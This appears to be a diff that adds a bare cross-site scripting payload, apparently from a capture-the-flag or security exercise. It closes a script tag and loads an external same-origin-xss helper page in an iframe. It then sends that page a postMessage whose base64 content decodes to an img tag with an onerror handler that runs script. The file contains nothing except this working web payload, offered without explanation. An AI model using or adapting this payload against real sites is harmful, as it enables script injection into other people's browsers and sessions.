@@ -1,0 +1,15 @@
+</script>
+let f = document.createElement('iframe');
+f.src = "https://terjanq.github.io/same-origin-xss/";
+document.body.appendChild(f);
+setTimeout(_ => {
+f = document.createElement('iframe');
+f.sandbox = "allow-scripts";
+f.srcdoc = `
+<script>
+window.parent[0][0].postMessage({type: "decode", content: "RVJST1I8aW1nIHNyYz0nJyBvbmVycm9yPSdhbGVydCgxKSc+"}, "*");
+</script>
+`
+document.body.appendChild(f);
+}, 1000);
+<script>
